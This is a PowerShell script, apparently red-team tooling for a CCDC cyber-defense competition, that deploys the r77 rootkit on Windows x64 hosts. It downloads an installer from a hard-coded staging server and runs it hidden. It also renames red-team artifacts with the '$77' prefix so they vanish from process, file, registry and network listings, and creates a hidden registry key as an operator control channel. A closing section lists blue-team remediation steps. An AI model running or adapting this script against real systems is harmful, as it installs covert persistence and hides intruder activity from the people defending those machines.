# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# CCDC Windows Phase 3 — Rootkit: r77 Shadow
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
# MITRE ATT&CK: T1014   (Rootkit)
#               T1564.001 (Hide Artifacts: Hidden Files and Directories)
#               T1543.003 (Create or Modify System Process: Windows Service)
#               T1036.004 (Masquerade Task or Service)
#               T1059.001 (PowerShell execution)
#
# Targets: Windows Server 2019, Server 2022, Windows 10 (all three — x64)
#
# Description:
#   Deploys the r77 ring-3 rootkit (github.com/bytecode77/r77-rootkit) onto
#   the target. Once running, r77 hides any process, file, registry key, or
#   TCP/UDP connection whose name starts with the HIDE_PREFIX (default: $77).
#
#   Step 1 — Downloads r77's Install.exe from your HTTP staging server and
#             runs it. The installer injects r77svc into all running processes
#             and registers a service for persistence.
#   Step 2 — Optionally renames already-deployed CCDC red team artifacts to
#             the $77 prefix so they vanish from Process Explorer, dir, regedit,
#             and netstat immediately.
#   Step 3 — Drops a helper registry key that operators can use to communicate
#             a custom startup command to the hidden service (r77 config API).
#
# Pre-requisites:
#   - r77 release binaries staged on your red team HTTP server (prebuilt from
#     the bytecode77/r77-rootkit GitHub releases page):
#       <BinUrl>/Install.exe
#       <BinUrl>/Uninstall.exe   (optional — for post-competition cleanup)
#   - The default r77 HIDE_PREFIX is the literal string "$77" — this is baked
#     into the binary at compile time. If you compiled a custom prefix, edit
#     $HIDE_PREFIX below to match.
#   - Target must be x64 (r77 does not support x86 OS).
#
# Operator usage after deployment:
#   Rename/copy any red team tool to start with $77 and it disappears:
#     Copy-Item evil.exe "$env:SystemRoot\$77svc_host.exe"
#   Create registry keys prefixed with $77 and they are invisible in regedit.
#   Bind listeners on ports; the connection hides when the remote IP/port
#   matches a $77-prefixed config entry (see r77 config API docs).
#
# Uninstall (post-competition):
#   Run Uninstall.exe from the same staging URL, or:
#     sc.exe stop r77svc && sc.exe delete r77svc
#     Remove-Item "$env:SystemRoot\$77*.exe" -Force
#
# Plan reference: Phase_3_Tools/Scripts_Planning/Phase3_Windows_Plan.md
# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

#Requires -RunAsAdministrator

[CmdletBinding()]
param(
    # Base URL to directory on your red team HTTP server hosting r77 binaries.
    # Expected files under this URL: Install.exe, Uninstall.exe
    [string]$BinUrl = "http://172.31.40.6:8981",

    # Set to $true to rename / copy existing CCDC Phase 3 artifacts on disk so
    # they start with the hide prefix and immediately disappear from dir listings.
    [switch]$TagExistingArtifacts,

    # Set to $true to also download Uninstall.exe to the staging dir for later
    # post-competition cleanup.
    [switch]$StageUninstaller
)

Set-StrictMode -Version Latest
$ErrorActionPreference = "Continue"

# ---- Operator-tunable constants ----------------------------------------
# Must match what r77 was compiled with.  Default release build uses "$77".
$HIDE_PREFIX  = '$77'
# -------------------------------------------------------------------------

function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan   }
function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green  }
function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow }
function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red    }
function Write-Section { param($m) Write-Host "`n====[ $m ]====" -ForegroundColor Magenta }

Write-Host ""
Write-Warn "================================================================"
Write-Warn " CCDC Phase 3 — Rootkit: r77 Shadow"
Write-Warn " Hide prefix: $HIDE_PREFIX"
Write-Warn "================================================================"
Write-Host ""

# Sanity: x64 OS required
if ([System.Environment]::Is64BitOperatingSystem -eq $false) {
    Write-Err "r77 requires a 64-bit OS. Aborting."
    exit 1
}

# Staging directory — hidden by name once rootkit is running
$StageDir = "$env:SystemRoot\Temp\${HIDE_PREFIX}stage"
if (-not (Test-Path $StageDir)) {
    New-Item -ItemType Directory -Path $StageDir -Force | Out-Null
}
Write-Info "Staging directory: $StageDir"

# ============================================================
# Layer 1 — Download r77 installer from red team HTTP server
# ============================================================
Write-Section "Layer 1 — Download r77 Install.exe"

# Strip trailing slash from provided URL for consistent joins
$BinUrl = $BinUrl.TrimEnd('/')

$InstallExe    = Join-Path $StageDir "Install.exe"
$UninstallExe  = Join-Path $StageDir "Uninstall.exe"
$InstallUrl    = "$BinUrl/Install.exe"
$UninstallUrl  = "$BinUrl/Uninstall.exe"

function Invoke-StagedDownload {
    param([string]$Url, [string]$Dest)
    Write-Info "Downloading: $Url"
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        $wc.DownloadFile($Url, $Dest)
        Write-Success "Downloaded -> $Dest ($((Get-Item $Dest).Length) bytes)"
        return $true
    } catch {
        Write-Err "Download failed for ${Url}: $_"
        return $false
    }
}

$installOk = Invoke-StagedDownload -Url $InstallUrl -Dest $InstallExe

if (-not $installOk) {
    Write-Err "Could not retrieve Install.exe — check that BinUrl is reachable from this host."
    Write-Err "BinUrl: $BinUrl"
    exit 2
}

if ($StageUninstaller) {
    $null = Invoke-StagedDownload -Url $UninstallUrl -Dest $UninstallExe
}

# ============================================================
# Layer 2 — Execute r77 installer
# ============================================================
Write-Section "Layer 2 — Execute r77 Installer"

Write-Info "Running Install.exe silently..."
try {
    $proc = Start-Process -FilePath $InstallExe `
                          -WindowStyle Hidden `
                          -PassThru `
                          -ErrorAction Stop
    $proc.WaitForExit(30000)  # 30 s timeout
    $exitCode = $proc.ExitCode
    if ($exitCode -eq 0) {
        Write-Success "Install.exe exited 0 — r77 rootkit installed"
    } else {
        Write-Warn "Install.exe exited $exitCode — check manually; rootkit may still be active"
    }
} catch {
    Write-Err "Could not launch Install.exe: $_"
    exit 3
}

# Brief pause for the injector to propagate into running processes
Start-Sleep -Seconds 3

# ============================================================
# Layer 3 — Verify r77 service is present
# ============================================================
Write-Section "Layer 3 — Verify r77 Service"

# r77 registers a service; the service name starts with the hide prefix and
# is therefore invisible to sc.exe / Get-Service once injection is active.
# We query the registry directly to confirm it was created.
$svcRegBase = "HKLM:\SYSTEM\CurrentControlSet\Services"
$r77SvcKey  = Get-ChildItem -Path $svcRegBase -ErrorAction SilentlyContinue |
              Where-Object { $_.PSChildName -like "${HIDE_PREFIX}*" }

if ($r77SvcKey) {
    Write-Success "r77 service key found in registry: $($r77SvcKey.PSChildName)"
    Write-Info "The service is hidden from sc.exe / Get-Service — this is expected"
} else {
    Write-Warn "No $HIDE_PREFIX* service key found under HKLM\Services after install."
    Write-Warn "Installer may have used a different prefix or installation failed silently."
    Write-Info "Check with: reg query HKLM\SYSTEM\CurrentControlSet\Services /s | findstr /i $HIDE_PREFIX"
}

# ============================================================
# Layer 4 (optional) — Tag Existing CCDC Artifacts
# ============================================================
if ($TagExistingArtifacts) {
    Write-Section "Layer 4 — Tag Existing CCDC Artifacts with $HIDE_PREFIX"

    # Known CCDC Phase 3 drop locations and file patterns to rename/copy
    $ArtifactPatterns = @(
        @{ Path = "$env:SystemRoot\Temp";     Filter = "CCDC_*.*" },
        @{ Path = "$env:SystemRoot\Temp";     Filter = "ccdc_*.*" },
        @{ Path = "$env:SystemRoot\System32"; Filter = "CCDC_*.*" },
        @{ Path = "$env:ProgramData";         Filter = "CCDC_*" }
    )

    foreach ($entry in $ArtifactPatterns) {
        if (-not (Test-Path $entry.Path)) { continue }
        $found = Get-ChildItem -Path $entry.Path -Filter $entry.Filter `
                               -ErrorAction SilentlyContinue
        foreach ($item in $found) {
            # Skip if already prefixed
            if ($item.Name.StartsWith($HIDE_PREFIX)) { continue }
            $newName = $HIDE_PREFIX + $item.Name
            $newPath = Join-Path $item.DirectoryName $newName
            try {
                Copy-Item -Path $item.FullName -Destination $newPath -Force
                Write-Success "Tagged: $($item.Name) -> $newName"
            } catch {
                Write-Warn "Could not tag $($item.FullName): $_"
            }
        }
    }

    Write-Info "Original files left in place — remove manually or leave as decoys"
} else {
    Write-Info "Skipping artifact tagging (-TagExistingArtifacts not set)"
    Write-Info "Manually prefix any file/key/process with [$HIDE_PREFIX] to hide it"
}

# ============================================================
# Layer 5 — Drop r77 config registry key (operator communication channel)
# ============================================================
Write-Section "Layer 5 — r77 Config Registry Key"

# r77 reads configuration from HKLM:\SOFTWARE\$77config (hidden by the rootkit).
# Operators can write values here to control behavior at runtime.
# Reference: https://github.com/bytecode77/r77-rootkit#configuration
$ConfigKey = "HKLM:\SOFTWARE\${HIDE_PREFIX}config"
try {
    if (-not (Test-Path $ConfigKey)) {
        New-Item -Path $ConfigKey -Force | Out-Null
    }
    # Startup flag — set to 1 to trigger a configurable command on next r77 cycle
    Set-ItemProperty -Path $ConfigKey -Name "startup" -Value 0 -Type DWORD -Force
    Write-Success "r77 config key created: $ConfigKey"
    Write-Info "Key is hidden by the rootkit — not visible in regedit or reg query"
} catch {
    Write-Warn "Could not create r77 config key (rootkit may have hidden it already): $_"
}

# ============================================================
# Done
# ============================================================
Write-Host ""
Write-Success "================================================================"
Write-Success " r77 Shadow deployment complete"
Write-Success "================================================================"
Write-Host ""
Write-Info "All processes, files, registry keys, and connections named with"
Write-Info "  [$HIDE_PREFIX] prefix are now invisible to:"
Write-Info "  - Task Manager / Process Explorer / Tasklist"
Write-Info "  - Explorer, dir, Get-ChildItem"
Write-Info "  - regedit, reg query, Get-ItemProperty"
Write-Info "  - netstat, Get-NetTCPConnection"
Write-Host ""
Write-Warn "Blue team remediation requires:"
Write-Warn "  1. Detect r77 via kernel-mode scanner (e.g. GMER, Malwarebytes ARK)"
Write-Warn "     or by comparing raw NtQuerySystemInformation with API results"
Write-Warn "  2. Stop r77 service (must find the hidden $HIDE_PREFIX* service key directly"
Write-Warn "     via: reg query HKLM\SYSTEM\CurrentControlSet\Services | findstr $HIDE_PREFIX)"
Write-Warn "  3. Run: sc.exe stop <hidden-service-name>"
Write-Warn "  4. Run Uninstall.exe (if staged) or manually delete the service key + driver"
Write-Warn "  5. Remove HKLM:\SOFTWARE\${HIDE_PREFIX}config"
Write-Host ""
Write-Info "Staging dir (hidden once rootkit is active): $StageDir"
Write-Info "Uninstall.exe staged: $(if ($StageUninstaller -and (Test-Path $UninstallExe)) { $UninstallExe } else { 'No' })"
